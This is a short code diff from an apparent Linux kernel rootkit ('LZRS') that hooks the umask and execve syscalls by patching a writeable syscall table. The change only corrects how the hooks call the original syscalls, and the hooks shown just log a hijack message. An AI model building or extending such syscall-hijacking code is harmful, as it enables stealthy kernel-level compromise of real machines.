@@ -32,7 +32,7 @@ asmlinkage int evil_umask(mode_t mask)
   printk("[+] LZRS - program flow hijacked - umask()");
 
   /* call the origin syscall */
-  return def_umask(mode_t mask);
+  return def_umask(mask);
 }
 
 asmlinkage int evil_execve(const char *filename, const char *const argv[], const char *const envp[])
@@ -40,7 +40,7 @@ asmlinkage int evil_execve(const char *filename, const char *const argv[], const
   printk("[+] LZRS - program flow hijacked - execve()");
 
   /* call the origin syscall */
-  return def_execve(const char *filename, const char *const argv[], const char *const envp[]);
+  return def_execve(filename, argv, envp);
 }
 
 /* make SCT writeable */
